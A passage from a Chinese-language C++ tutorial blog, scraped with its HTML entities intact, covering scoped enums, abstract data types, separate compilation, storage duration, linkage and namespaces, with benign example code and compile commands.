枚举量（enumerators）被放置在与枚举定义相同的作用域中，容易与其他名称（包括其他枚举的枚举量）发生冲突。 隐式转换: 枚举量可以隐式地转换为整型，有时这可能导致逻辑错误或降低类型安全性。 1234567enum OldColor &#123; RED, GREEN, BLUE &#125;;enum StopLight &#123; RED, YELLOW, GREEN &#125;; // 错误！RED 和 GREEN 重定义OldColor myColor = RED; // OKint colorValue = myColor; // OK, 隐式转换为 int (值为 0)if (myColor == 0) &#123; /* ... */ &#125; // 可以和整数比较 为了解决这些问题，C++11 引入了**作用域内枚举 (Scoped Enumerations)**，使用 enum class 或 enum struct 关键字定义。 特点: 作用域限制: 枚举量的作用域被限制在枚举本身内部。访问枚举量必须使用枚举名称和作用域解析运算符 ::。 无隐式转换: 作用域内枚举类型不能隐式地转换为整型或其他类型。如果需要转换，必须使用显式类型转换（如 static_cast）。 类型安全: 增强了类型安全性，不同作用域枚举类型的值不能直接比较（除非重载了比较运算符）。 可指定底层类型: 可以显式指定枚举使用的底层整数类型（默认为 int）。 语法: 1234enum class EnumName : UnderlyingType &#123; Enumerator1, Enumerator2, ... &#125;;// 或者 enum struct (功能相同)enum struct EnumName : UnderlyingType &#123; Enumerator1, Enumerator2, ... &#125;;// : UnderlyingType 是可选的 示例: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;// 使用 enum class 定义作用域内枚举enum class Color : unsigned char &#123; // 指定底层类型为 unsigned char RED, // Color::RED GREEN, // Color::GREEN BLUE // Color::BLUE&#125;;enum class TrafficLight &#123; RED, // TrafficLight::RED (与 Color::RED 不冲突) YELLOW, GREEN&#125;;int main() &#123; Color myColor = Color::RED; // 必须使用作用域解析符 TrafficLight light = TrafficLight::GREEN; // 错误！枚举量不在当前作用域 // Color anotherColor = RED; // 错误！不能隐式转换为 int // int colorCode = myColor; // 需要显式转换 int colorCode = static_cast&lt;int&gt;(myColor); unsigned char underlyingValue = static_cast&lt;unsigned char&gt;(myColor); std::cout &lt;&lt; &quot;Color code: &quot; &lt;&lt; colorCode &lt;&lt; std::endl; // 输出 0 std::cout &lt;&lt; &quot;Underlying value: &quot; &lt;&lt; static_cast&lt;int&gt;(underlyingValue) &lt;&lt; std::endl; // 输出 0 (需要再次转换才能打印为数字) // 错误！不同枚举类型不能直接比较 // if (myColor == light) &#123; /* ... */ &#125; // 可以与相同类型的枚举量比较 if (myColor == Color::RED) &#123; std::cout &lt;&lt; &quot;The color is red.&quot; &lt;&lt; std::endl; &#125; if (light == TrafficLight::GREEN) &#123; std::cout &lt;&lt; &quot;The light is green.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 作用域内枚举是现代 C++ 中定义枚举类型的首选方式，因为它更安全、更不容易出错，并且避免了名称污染。 总结 类成员（数据、函数、类型、常量、枚举）具有类作用域。 在类外部访问类成员需要通过对象（. 或 -&gt;）或类名（::）。 类作用域可以隔离名称，防止与全局或其他类中的名称冲突。 可以使用 static const (整型/枚举) 或 static constexpr (C++11, 推荐) 在类内部定义常量。 C++11 引入了**作用域内枚举 (enum class 或 enum struct)**，其枚举量作用域限制在枚举内，且不能隐式转换为整型，提高了代码的安全性和清晰度。 10.7 抽象数据类型我们在本章中学习的类是 C++ 实现抽象数据类型 (Abstract Data Type, ADT) 的一种方式。ADT 是一种计算机科学的概念，它是一种数学模型，用于描述具有特定行为（语义）的数据类型，重点在于可以对数据执行的操作，而不是这些操作的具体实现方式或数据的内部表示。 ADT 的核心思想: 数据封装: ADT 将数据以及对这些数据进行操作的函数捆绑在一起。 接口与实现分离: ADT 定义了一个公共接口 (Interface)**，即一组可以对数据执行的操作。用户通过这个接口与数据交互，而不需要知道数据是如何存储的，或者操作是如何实现的（实现细节隐藏**）。 可以把 ADT 想象成一个“黑盒子”。你知道你可以给这个盒子提供什么输入（通过接口调用操作），以及你会得到什么输出或结果，但你不需要（也不能）看到盒子内部的构造。 与内置类型的类比: 想想 C++ 的内置类型 int。 数据: 它可以表示整数。 操作: 你可以对 int 执行加、减、乘、除、比较等操作。 抽象: 你使用这些操作时，并不需要关心 int 在内存中是如何用二进制位表示的，或者加法操作在 CPU 层面是如何执行的。你只关心操作的效果。 ADT 将这种思想扩展到了用户自定义的数据类型。 C++ 类如何实现 ADT: C++ 类天然地支持 ADT 的概念： 数据表示: 类的数据成员（通常是 private）用于存储 ADT 的数据。 操作接口: 类的公有成员函数（public methods）定义了 ADT 的公共接口，即允许外部代码执行的操作。 实现隐藏: 将数据成员设为 private，并将实现细节（如私有辅助函数、成员函数的具体代码）与接口（类定义中的公有声明）分离，实现了数据隐藏和封装。 以 Stock 类为例: 我们可以将 Stock 类视为一个“股票持有” ADT。 ADT 描述: 一个表示某公司股票持有情况的类型。 数据 (概念上): 公司名称、持有股数、当前股价、总价值。 操作 (接口): 创建一个股票持有记录（构造函数）。 买入指定数量的股票（buy 方法）。 卖出指定数量的股票（sell 方法）。 更新股票价格（update 方法）。 显示股票持有信息（show 方法）。 (可能还有) 获取总价值、获取公司名称等。 实现 (隐藏细节): 数据成员 company, shares, share_val, total_val 的具体类型（std::string, long, double）。 私有辅助函数 set_tot() 的存在及其实现。 buy, sell, update, show 等函数的具体代码逻辑。 使用 Stock 类的程序员（客户端代码）只需要了解其公共接口（public 方法）。他们可以创建 Stock 对象，调用 buy(), sell(), show() 等方法来完成任务，而无需关心 total_val 是如何计算和更新的，或者 company 是用 std::string 还是 C 风格字符串存储的。如果类的设计者决定改变内部实现（例如，优化 set_tot 的计算），只要公共接口保持不变，客户端代码就无需修改。 ADT 的好处: 抽象: 简化复杂性，让用户关注“做什么”而非“怎么做”。 封装: 保护数据不被意外破坏，隐藏实现细节。 模块化: 将程序分解为独立的、功能明确的单元（类/ADT）。 可维护性: 修改一个 ADT 的内部实现不会影响使用该 ADT 的其他代码（只要接口不变）。 可重用性: 设计良好的 ADT 可以在不同的程序中重复使用。 因此，在设计 C++ 类时，以 ADT 的思维方式进行思考——明确这个类代表什么概念，它应该提供哪些操作（公共接口），以及需要隐藏哪些内部细节——是非常有益的。这有助于创建出结构清晰、易于使用和维护的代码。 10.8 总结本章介绍了面向对象编程（OOP）的核心概念，并深入探讨了 C++ 实现 OOP 的主要机制——**类 (Class)**。类是用户定义类型的基础，它允许我们将数据和操作数据的函数封装在一起。 主要内容回顾： 过程性编程 vs. 面向对象编程: 过程性编程关注执行步骤和函数，而面向对象编程关注数据及其相关操作，将它们封装在对象 (Object) 中。OOP 的核心思想包括封装、抽象、继承和多态。 抽象和类: 抽象是关注本质特征、忽略实现细节的过程。 类是创建对象的蓝图，定义了对象的数据成员（属性）和成员函数（方法）。 访问说明符（public, private, protected）控制对类成员的访问。public 成员构成类的公共接口，而 private 成员（通常是数据）实现了数据隐藏，是封装的关键。 类的成员函数通常在类定义中声明，在单独的源文件中使用作用域解析运算符 :: 定义。 通过类的对象使用**点号 .**（或指针使用箭头 -&gt;）访问其公有成员。 构造函数和析构函数: 构造函数是与类同名的特殊成员函数，在创建对象时自动调用，用于初始化对象。它可以被重载。如果用户未定义任何构造函数，编译器会生成一个默认构造函数（无参）。如果用户定义了任何构造函数，编译器就不再生成默认构造函数。 析构函数是类名前加 ~ 的特殊成员函数，在对象生命周期结束时自动调用，用于执行清理工作（如释放 new 分配的内存）。它没有参数，不能重载。 this 指针: 每个非静态成员函数都有一个隐含的 this 指针，指向调用该函数的对象。 通常隐式使用，但在需要区分同名参数和成员、或需要返回对象自身引用/指针（如链式调用）时显式使用 this 或 *this。 对象数组: 可以创建类对象的数组。 创建数组时，会为每个元素调用构造函数（通常是默认构造函数，除非使用初始化列表）。 访问方式为 arrayName[index].member。 动态对象数组使用 new ClassName[size] 创建，需要默认构造函数，并用 delete [] ptr 释放。 类作用域: 类成员（数据、函数、类型、常量、枚举）具有类作用域，在类外部访问需要限定。 可以使用 static const 或 static constexpr (C++11 推荐) 定义类范围内的常量。 C++11 引入了**作用域内枚举 (enum class)**，提高了枚举的类型安全性和作用域控制。 抽象数据类型 (ADT): ADT 是一个侧重于操作接口而非内部实现的数学模型。 C++ 类是实现 ADT 的强大工具，通过公共接口提供操作，通过私有成员隐藏实现细节，体现了封装和抽象的原则。 通过使用类，我们可以创建模块化、可重用、易于维护的复杂程序，更好地模拟现实世界的问题。掌握类的设计和使用是精通 C++ 的关键一步。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 9 内存模型和名称空间","slug":"Cpp_tutorial_Chapter_9","date":"2025-04-26T12:03:35.395Z","updated":"2025-04-26T12:02:22.963Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_9/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_9/","excerpt":"","text":"9.1 单独编译随着程序变得越来越大，将所有代码都放在一个巨大的 main.cpp 文件中会变得难以管理和维护。C++ 支持**单独编译 (Separate Compilation)**，允许我们将程序分解成多个独立的源文件（通常是 .cpp 文件）和头文件（通常是 .h 或 .hpp 文件）。 这样做的好处: 组织性: 将相关的函数、类等放在不同的文件中，使项目结构更清晰。 可重用性: 可以将通用的功能（如工具函数、类定义）放在单独的文件中，方便在其他项目中重用。 模块化: 每个文件可以专注于特定的功能模块。 编译效率: 当修改某个 .cpp 文件时，通常只需要重新编译该文件，然后与其他未改变的目标文件重新链接即可，无需重新编译整个项目，大大节省了编译时间。 基本概念单独编译通常涉及两种主要的文件类型： 头文件 (.h 或 .hpp): 目的: 包含**声明 (Declarations)**，告诉编译器某个函数、类或变量的“接口”是什么样的，但不包含具体的实现代码（除了模板和内联函数）。 典型内容: 函数原型（函数声明） 类 (class) 定义 结构 (struct) 定义 枚举 (enum) 定义 模板 (template) 定义 内联函数 (inline) 定义 const 常量定义 using 声明或指令 #include 指令: 源文件通过 #include &quot;header_file.h&quot; 指令将头文件的内容包含进来，以便编译器知道如何使用其中声明的函数或类。 包含卫哨 (Include Guards): 为了防止同一个头文件被意外地多次包含到同一个源文件中（这可能导致重定义错误），头文件通常使用包含卫哨。 123456789// myheader.h#ifndef MYHEADER_H_ // 如果 MYHEADER_H_ 还没有被定义过#define MYHEADER_H_ // 就定义 MYHEADER_H_// 头文件的实际内容放在这里...void my_function(int x);class MyClass &#123; /* ... */ &#125;;#endif // MYHEADER_H_ 或者使用 C++ 特有的 #pragma once 指令（更简洁，但不是所有编译器都支持，尽管非常普遍）： 123456// myheader.h#pragma once// 头文件的实际内容放在这里...void my_function(int x);class MyClass &#123; /* ... */ &#125;; 源文件 (.cpp): 目的: 包含**定义 (Definitions)**，即函数或方法的具体实现代码，以及全局变量的定义和初始化。 典型内容: 函数体（实现） 类成员函数的实现 全局变量的定义和初始化 main 函数（通常在一个单独的 .cpp 文件中） 编译: 每个 .cpp 文件通常会被编译器独立地编译成一个**目标文件 (Object File)**（通常是 .obj 或 .o 文件）。目标文件包含了该源文件对应的机器代码，但可能还包含对其他文件中定义的函数或变量的引用。 编译和链接过程在C++中，将源代码转换为可执行程序通常分为编译和链接两个主要阶段。让我们看看这些过程中涉及的具体命令： 编译命令使用g++（GNU C++ 编译器）: 123456789## 编译单个源文件g++ -c utils.cpp # 生成 utils.o 目标文件g++ -c main.cpp # 生成 main.o 目标文件## 添加优化选项g++ -c -O2 utils.cpp # 使用O2级别的优化## 添加调试信息g++ -c -g utils.cpp # 包含调试信息 使用MSVC（Microsoft Visual C++）: 123456789## 编译单个源文件cl /c utils.cpp # 生成 utils.obj 目标文件cl /c main.cpp # 生成 main.obj 目标文件## 添加优化选项cl /c /O2 utils.cpp # 使用O2级别的优化## 添加调试信息cl /c /Zi utils.cpp # 包含调试信息 链接命令使用g++: 12345## 链接目标文件生成可执行文件g++ main.o utils.o -o myprogram## 链接并指定库文件g++ main.o utils.o -lmath -o myprogram 使用MSVC: 12345## 链接目标文件生成可执行文件link main.obj utils.obj /OUT:myprogram.exe## 链接并指定库文件link main.obj utils.obj math.lib /OUT:myprogram.exe 一步完成编译和链接通常，我们可以在一个命令中完成编译和链接: 12345## 使用g++g++ main.cpp utils.cpp -o myprogram## 使用MSVCcl main.cpp utils.cpp /Fe:myprogram.exe 编译器会自动处理中间步骤，生成必要的目标文件，然后链接它们创建最终的可执行文件。 一个包含多个文件的 C++ 项目的典型构建过程如下： 编译 (Compilation): 编译器分别处理每个 .cpp 源文件。对于每个 .cpp 文件： 预处理器处理 #include 指令，将头文件的内容插入到源文件中。 编译器将处理后的源代码翻译成机器码，生成一个目标文件 (.obj 或 .o)。 链接 (Linking): 链接器 (Linker) 将所有由编译器生成的目标文件以及可能需要的库文件（包含预编译代码，如标准库）组合在一起。 链接器负责解析目标文件之间的交叉引用（例如，main.cpp 调用了在 utils.cpp 中定义的函数）。 如果所有引用都能找到对应的定义，并且没有重定义等错误，链接器就会生成最终的可执行文件（如 .exe 文件）。 示例假设我们创建一个简单的项目，包含一个计算功能的工具函数。 1. 头文件 (utils.h) 包含函数声明和包含卫哨。 12345678// filepath: d:\\ProgramData\\files_Cpp\\250424\\utils.h#ifndef UTILS_H_#define UTILS_H_// 函数原型 (声明)int add(int a, int b);#endif // UTILS_H_ 2. 源文件 (utils.cpp) 包含函数的具体实现。它需要包含自己的头文件以确保声明和定义匹配。 1234567// filepath: d:\\ProgramData\\files_Cpp\\250424\\utils.cpp#include &quot;utils.h&quot; // 包含头文件// 函数定义 (实现)int add(int a, int b) &#123; return a + b;&#125; 3. 主程序文件 (main.cpp) 使用 utils.h 中声明的函数。 12345678910111213// filepath: d:\\ProgramData\\files_Cpp\\250424\\main.cpp#include &lt;iostream&gt;#include &quot;utils.h&quot; // 包含头文件以使用 add 函数int main() &#123; int x = 5; int y = 3; int sum = add(x, y); // 调用在 utils.cpp 中定义的函数 std::cout &lt;&lt; &quot;The sum of &quot; &lt;&lt; x &lt;&lt; &quot; and &quot; &lt;&lt; y &lt;&lt; &quot; is: &quot; &lt;&lt; sum &lt;&lt; std::endl; return 0;&#125; 构建过程: 编译 utils.cpp: compiler utils.cpp -&gt; utils.obj 编译 main.cpp: compiler main.cpp -&gt; main.obj 链接: linker main.obj utils.obj -&gt; myprogram.exe (或类似名称) 声明 vs. 定义: 理解声明和定义的区别对于单独编译至关重要： 声明 (Declaration): 告诉编译器某个东西（函数、变量、类等）的存在及其接口（名称、类型、参数等）。一个声明可以出现多次（只要它们一致）。头文件主要包含声明。 定义 (Definition): 提供了某个东西的具体实现或内存分配。对于非内联函数和非静态数据成员，一个定义在一个程序中只能出现一次（单一定义规则 - One Definition Rule, ODR）。源文件主要包含定义。 头文件充当了不同源文件之间的“契约”，确保它们对共享的函数和类有共同的理解，而链接器则负责将这些部分最终组装在一起。 9.2 存储持续性、作用域和链接性C++ 使用多种方案来管理内存中的数据。了解这些方案对于理解变量和函数的生命周期、可见性以及它们如何在不同文件间共享至关重要。主要涉及三个核心概念： 存储持续性 (Storage Duration): 决定了对象（变量）在内存中保留多长时间。 作用域 (Scope): 描述了标识符（变量名、函数名等）在程序代码中的可见范围。 链接性 (Linkage): 决定了在不同编译单元（.cpp 文件）中声明的同名标识符是否指向同一个实体。 C++ 主要有以下几种存储持续性： 自动存储持续性 (Automatic Storage Duration): 对象在程序执行进入其定义所在的代码块时创建，在退出该代码块时销毁。通常在函数内部定义的变量（非 static）属于这种。内存通常在栈 (stack) 上分配。 静态存储持续性 (Static Storage Duration): 对象在程序启动时创建（或首次使用前），在整个程序运行期间都存在，直到程序结束时才销毁。全局变量、文件作用域的 static 变量、函数内部的 static 变量都属于这种。 线程存储持续性 (Thread Storage Duration) (C++11): 对象与特定线程的生命周期绑定。使用 thread_local 说明符声明。 动态存储持续性 (Dynamic Storage Duration): 对象通过 new 运算符在程序的自由存储区（堆, heap）上显式创建，并通过 delete 运算符显式销毁。其生命周期由程序员控制。 9.2.1 作用域和链接作用域 (Scope) 定义了标识符有效的代码区域。C++ 中的主要作用域包括： 块作用域 (Block Scope): 标识符在代码块（由 &#123;&#125; 包围）内可见，从声明点开始到代码块结束。函数内部的变量、循环变量等具有块作用域。 函数作用域 (Function Scope): 仅用于 goto 语句的标签，标签在整个函数内部都可见。 函数原型作用域 (Function Prototype Scope): 函数原型参数列表中的标识符仅在原型声明内部可见。 文件作用域 (File Scope) / 全局作用域 (Global Scope) / 名称空间作用域 (Namespace Scope): 在所有函数或类外部定义的标识符具有文件作用域（或更准确地说是名称空间作用域，全局作用域是默认的全局名称空间）。它们从声明点开始到文件末尾都可见。 类作用域 (Class Scope): 类成员（数据成员和成员函数）具有类作用域，在类定义内部以及通过对象、引用或指针访问时可见。 链接性 (Linkage) 描述了名称如何在不同的编译单元（.cpp 文件）之间共享。 无链接性 (No Linkage): 名称只在定义它的作用域内有效，不能被其他作用域或编译单元访问。具有块作用域的变量（包括函数内部的 static 变量）通常没有链接性。 内部链接性 (Internal Linkage): 名称可以在定义它的单个编译单元内的所有作用域中共享，但不能被其他编译单元访问。在文件作用域（全局或命名空间）使用 static 关键字声明的变量和函数，以及匿名命名空间中的实体具有内部链接性。 外部链接性 (External Linkage): 名称可以在多个编译单元之间共享。在文件作用域（全局或命名空间）声明的非 static 函数、非 static 非 const 全局变量、extern const 全局变量以及类等具有外部链接性。 9.2.2 自动存储持续性这是最常见的存储方式，适用于函数内部定义的局部变量（未使用 static、extern 或 thread_local）。 存储持续性: 自动。进入代码块时创建，退出时销毁。 作用域: 块作用域。 链接性: 无链接性。 123456789101112131415161718192021#include &lt;iostream&gt;void my_func() &#123; int auto_var = 10; // 自动变量 std::cout &lt;&lt; &quot;Inside my_func: auto_var = &quot; &lt;&lt; auto_var &lt;&lt; std::endl; auto_var++; // 修改只在本次调用有效&#125; // auto_var 在这里被销毁int main() &#123; int main_var = 5; // main 函数的自动变量 if (main_var &gt; 0) &#123; double block_var = 3.14; // 块作用域的自动变量 std::cout &lt;&lt; &quot;Inside if block: block_var = &quot; &lt;&lt; block_var &lt;&lt; std::endl; &#125; // block_var 在这里被销毁 // std::cout &lt;&lt; block_var; // 错误！block_var 在此作用域不可见 my_func(); // 调用 my_func，创建并销毁其 auto_var my_func(); // 再次调用，创建新的 auto_var，其值仍是 10 return 0;&#125; 9.2.3 静态持续变量静态持续变量在程序整个运行期间都存在。根据链接性不同，它们有不同的用途和可见性。 9.2.4 静态持续性、外部链接性这些变量（有时称为全局变量）可以在程序的多个文件中共享。 定义: 在所有函数外部定义，且未使用 static 关键字。 存储持续性: 静态。 作用域: 文件作用域（从定义点到文件尾）。 链接性: 外部链接性。 初始化: 如果未显式初始化，会被自动初始化为零（或对应类型的零值）。 共享: 要在其他文件中使用，需要使用 extern 关键字进行声明（不是定义）。 示例: 1234567891011121314// file1.cpp#include &lt;iostream&gt;// 定义具有外部链接性的全局变量double global_data = 3.14; // 显式初始化int count; // 隐式初始化为 0void increment_count() &#123; count++;&#125;void display_data() &#123; std::cout &lt;&lt; &quot;In file1: global_data = &quot; &lt;&lt; global_data &lt;&lt; &quot;, count = &quot; &lt;&lt; count &lt;&lt; std::endl;&#125; 1234567891011121314151617181920212223// file2.cpp#include &lt;iostream&gt;// 声明 file1 中定义的全局变量 (使用 extern)extern double global_data;extern int count;// 声明 file1 中定义的函数 (函数声明默认 extern)void increment_count();void display_data();void use_globals() &#123; std::cout &lt;&lt; &quot;In file2 (before increment): global_data = &quot; &lt;&lt; global_data &lt;&lt; &quot;, count = &quot; &lt;&lt; count &lt;&lt; std::endl; increment_count(); // 调用 file1 中的函数，修改 file1 中的 count std::cout &lt;&lt; &quot;In file2 (after increment): global_data = &quot; &lt;&lt; global_data &lt;&lt; &quot;, count = &quot; &lt;&lt; count &lt;&lt; std::endl;&#125;int main() &#123; display_data(); // 调用 file1 的函数 use_globals(); // 调用 file2 的函数 display_data(); // 再次调用 file1 的函数，查看 count 的变化 return 0;&#125; 编译和链接: 12g++ file1.cpp file2.cpp -o myprogram./myprogram 输出: 1234In file1: global_data &#x3D; 3.14, count &#x3D; 0In file2 (before increment): global_data &#x3D; 3.14, count &#x3D; 0In file2 (after increment): global_data &#x3D; 3.14, count &#x3D; 1In file1: global_data &#x3D; 3.14, count &#x3D; 1 注意: 过度使用具有外部链接性的全局变量会增加模块间的耦合度，使程序难以理解和维护，应尽量避免。 9.2.5 静态持续性、内部链接性这些变量和函数的作用域限制在单个编译单元（.cpp 文件）内，有助于避免不同文件间的命名冲突。 定义: 在所有函数外部定义，并使用 static 关键字。或者定义在匿名命名空间中。 存储持续性: 静态。 作用域: 文件作用域。 链接性: 内部链接性。 初始化: 同外部链接性变量，默认为零值。 共享: 不能被其他编译单元通过 extern 访问。 示例: 12345678910111213141516// service.cpp#include &lt;iostream&gt;// 具有内部链接性的静态全局变量static int service_counter = 0; // 只在 service.cpp 可见// 具有内部链接性的静态函数static void internal_helper() &#123; std::cout &lt;&lt; &quot;Internal helper called.&quot; &lt;&lt; std::endl;&#125;void provide_service() &#123; internal_helper(); service_counter++; std::cout &lt;&lt; &quot;Service provided. Counter: &quot; &lt;&lt; service_counter &lt;&lt; std::endl;&#125; 123456789101112131415// main.cpp#include &lt;iostream&gt;// 声明 service.cpp 中的函数 (具有外部链接性)void provide_service();// extern int service_counter; // 错误！无法访问内部链接性的变量// static void internal_helper(); // 错误！无法访问内部链接性的函数int main() &#123; provide_service(); provide_service(); // std::cout &lt;&lt; service_counter; // 错误！ return 0;&#125; 编译和链接: 12g++ service.cpp main.cpp -o myapp./myapp 输出: 1234Internal helper called.Service provided. Counter: 1Internal helper called.Service provided. Counter: 2 匿名命名空间 (Unnamed/Anonymous Namespace): C++ 提供匿名命名空间作为 static 用于内部链接性的更好替代方案。在匿名命名空间中声明的所有内容都具有内部链接性。 123456789101112131415// service_v2.cpp#include &lt;iostream&gt;namespace &#123; // 匿名命名空间 int service_counter_v2 = 0; // 内部链接性 void internal_helper_v2() &#123; // 内部链接性 std::cout &lt;&lt; &quot;Internal helper v2 called.&quot; &lt;&lt; std::endl; &#125;&#125; // end anonymous namespacevoid provide_service_v2() &#123; internal_helper_v2(); service_counter_v2++; std::cout &lt;&lt; &quot;Service v2 provided. Counter: &quot; &lt;&lt; service_counter_v2 &lt;&lt; std::endl;&#125; 9.2.6 静态存储持续性、无链接性这种变量在函数内部声明，但使用 static 关键字。 定义: 在代码块（通常是函数）内部，使用 static 关键字。 存储持续性: 静态。它们在程序启动时或第一次执行到其定义时创建，并在整个程序生命周期内存在。 作用域: 块作用域。它们只能在定义它们的代码块内部按名称访问。 链接性: 无链接性。 初始化: 只在程序执行第一次到达其定义时初始化一次。如果未显式初始化，默认为零值。 特性: 它们在函数调用之间保持其值。 示例: 123456789101112131415#include &lt;iostream&gt;void record_call() &#123; static int call_count = 0; // 静态局部变量，只初始化一次 call_count++; std::cout &lt;&lt; &quot;Function record_call has been called &quot; &lt;&lt; call_count &lt;&lt; &quot; times.&quot; &lt;&lt; std::endl;&#125;int main() &#123; record_call(); record_call(); record_call(); // std::cout &lt;&lt; call_count; // 错误！call_count 在 main 中不可见 return 0;&#125; 输出: 123Function record_call has been called 1 times.Function record_call has been called 2 times.Function record_call has been called 3 times. 9.2.7 说明符和限定符C++ 提供了一些关键字来修改变量或函数的存储持续性、链接性或行为： static: 用于文件作用域：指定内部链接性。 用于块作用域：指定静态存储持续性（和无链接性）。 用于类成员：表示成员属于类本身，而不是类的特定对象（将在类章节详细介绍）。 extern: 用于变量：声明一个在别处（通常是另一个文件）定义的具有外部链接性的变量。它不创建变量，只是告诉编译器该变量存在。 extern &quot;C&quot;: 指定语言链接性（见 9.2.9）。 const: 限定符，表示变量的值不能被修改。 const 全局变量默认具有内部链接性。要使其具有外部链接性，必须使用 extern const 声明，并在定义时也加上 extern。 123456789// header.hextern const int MAX_USERS; // 声明外部链接的 const// config.cppextern const int MAX_USERS = 100; // 定义外部链接的 const// utils.cpp#include &quot;header.h&quot;void check_users() &#123; if (user_count &gt; MAX_USERS) &#123; /*...*/ &#125; &#125; 或者，更常见的做法是将 const 定义在头文件中（因为它默认内部链接，不会引起重定义问题），或者使用 C++11 的 constexpr。 thread_local (C++11): 指定线程存储持续性。每个线程将拥有该变量的独立副本。 volatile: 限定符，告诉编译器变量的值可能在程序代码未显式修改的情况下发生改变（例如，由硬件或其他并发线程修改）。编译器不会对 volatile 变量进行某些优化（如缓存到寄存器）。 mutable: 限定符，仅用于类的数据成员。允许在 const 成员函数中修改被 mutable 修饰的成员变量。 9.2.8 函数和链接性函数默认具有外部链接性，这意味着在一个文件中定义的函数可以在其他文件中声明和调用。 1234567// math_utils.cppdouble square(double x) &#123; return x * x; &#125; // 外部链接性 (默认)// main.cpp#include &lt;iostream&gt;double square(double x); // 声明 (默认 extern)int main() &#123; std::cout &lt;&lt; square(5.0) &lt;&lt; std::endl; return 0; &#125; 可以使用 static 关键字将函数的链接性改为内部链接性，使其仅在定义的 .cpp 文件内可见。 1234567891011// helper.cpp#include &lt;iostream&gt;static void internal_print(const char* msg) &#123; // 内部链接性 std::cout &lt;&lt; &quot;[Internal] &quot; &lt;&lt; msg &lt;&lt; std::endl;&#125;void public_helper() &#123; internal_print(&quot;Public helper called&quot;); &#125;// main.cppvoid public_helper();// static void internal_print(const char*); // 错误！无法访问int main() &#123; public_helper(); return 0; &#125; 9.2.9 语言链接性C++ 程序有时需要调用用其他语言（主要是 C 语言）编写的函数。由于 C++ 支持函数重载（通过名称修饰），而 C 语言不支持，直接链接可能会失败。语言链接性 (Language Linkage) 机制允许指定函数应遵循哪种语言的链接约定。 最常用的是 extern &quot;C&quot;，它指示编译器使用 C 语言的链接约定（通常只是函数名本身，没有修饰）。 用法: 单个函数: 1extern &quot;C&quot; void c_style_function(int); 多个函数块: 12345extern &quot;C&quot; &#123; #include &lt;stdio.h&gt; // 包含 C 头文件 int c_function1(double); void c_function2(const char*);&#125; 当在 C++ 代码中包含 C 语言的头文件时，这些头文件通常已经使用了 extern &quot;C&quot;（通过条件编译 __cplusplus 宏）来确保 C++ 编译器能正确链接其中的函数。 1234567891011// C 头文件 my_c_lib.h 可能包含类似结构#ifdef __cplusplusextern &quot;C&quot; &#123;#endifvoid c_api_call(int);// ... 其他 C 函数声明 ...#ifdef __cplusplus&#125; // extern &quot;C&quot;#endif 9.2.10 存储方案和动态分配总结一下主要的存储方案： 自动存储: 栈内存，生命周期与代码块绑定，自动管理。 静态存储: 程序生命周期内存在，根据链接性（外部、内部、无）决定可见性。 线程存储: 生命周期与线程绑定。 动态存储: 堆内存（自由存储区），生命周期由 new 和 delete 手动管理。 动态分配 (new/delete) 提供了最大的灵活性，允许在运行时根据需要创建和销毁对象，但同时也带来了手动管理内存的责任，容易出错（如内存泄漏、悬挂指针）。后续章节将更详细地探讨动态内存管理，特别是与类结合使用时。 9.3 名称空间随着项目越来越大，或者当你需要使用来自不同开发者的代码库时，可能会遇到一个问题：名称冲突。例如，你可能定义了一个名为 List 的类，而另一个库也定义了一个同名的 List 类。当你在同一个程序中使用这两个类时，编译器就无法区分你指的是哪个 List。 为了解决这个问题，C++引入了名称空间 (Namespace) 的概念。名称空间提供了一种将全局作用域划分为不同逻辑部分的方法，每个部分包含一组相关的名称（如变量、函数、类等）。 9.3.1 传统的C++名称空间在名称空间特性被引入之前，C++只有一个**全局名称空间 (Global Namespace)**。所有在任何函数、类或结构外部声明的名称都属于全局名称空间。大型项目中，这很容易导致名称冲突，特别是当包含多个第三方库时。 开发者有时会使用一些约定来模拟名称空间，例如给所有相关的名称添加特定的前缀（如 mylib_List），但这并不是一个完美的解决方案。 9.3.2 新的名称空间特性C++标准引入了 namespace 关键字来显式地创建具名的名称空间。 定义名称空间: 12345678910namespace mycode &#123; // 在这里声明和定义变量、函数、类等 int value = 10; void printValue() &#123; std::cout &lt;&lt; &quot;Value: &quot; &lt;&lt; value &lt;&lt; std::endl; &#125; class MyClass &#123; // ... &#125;;&#125; // namespace mycode 访问名称空间成员: 有三种主要方法可以访问名称空间中的成员： 作用域解析运算符 :: (Scope Resolution Operator): 使用名称空间名称和 :: 来限定成员名。这是最安全的方式，因为它明确指出了使用的是哪个名称空间的成员。 12345678910#include &lt;iostream&gt;namespace mycode &#123; int value = 10;&#125;int main() &#123; std::cout &lt;&lt; mycode::value &lt;&lt; std::endl; // 输出 10 return 0;&#125; using 声明 (Using Declaration): 使特定的名称空间成员可用，就像它是在当前作用域声明的一样。 123456789101112131415#include &lt;iostream&gt;namespace mycode &#123; int value = 10; double score = 9.5;&#125;int main() &#123; using mycode::value; // 只让 value 可用 std::cout &lt;&lt; value &lt;&lt; std::endl; // 输出 10 (直接访问) // std::cout &lt;&lt; score &lt;&lt; std::endl; // 错误！score 未声明 std::cout &lt;&lt; mycode::score &lt;&lt; std::endl; // 需要限定符 return 0;&#125; using 指令 (Using Directive): 使整个名称空间的所有成员都可用。这比较方便，但也可能重新引入名称冲突的问题，应谨慎使用，尤其是在头文件中。 123456789101112131415#include &lt;iostream&gt;namespace mycode &#123; int value = 10; double score = 9.5;&#125;// 使用 using 指令使 mycode 的所有成员可用using namespace mycode;int main() &#123; std::cout &lt;&lt; value &lt;&lt; std::endl; // 输出 10 (直接访问) std::cout &lt;&lt; score &lt;&lt; std::endl; // 输出 9.5 (直接访问) return 0;&#125; std 名称空间: C++标准库的所有组件（如 cout, cin, string, vector 等）都被定义在 std 名称空间中。这就是为什么我们通常需要写 std::cout 或者在文件开头使用 using namespace std; 或 using std::cout;。 未命名的名称空间 (Unnamed Namespaces): 你也可以创建未命名的名称空间。这类似于使用 static 关键字声明具有内部链接性的全局变量或函数。未命名名称空间中的成员只能在当前文件内访问。 1234567891011namespace &#123; // 这些成员只在当前文件可见 int internal_count = 0; void increment() &#123; internal_count++; &#125;&#125;// 在同一文件中可以访问// 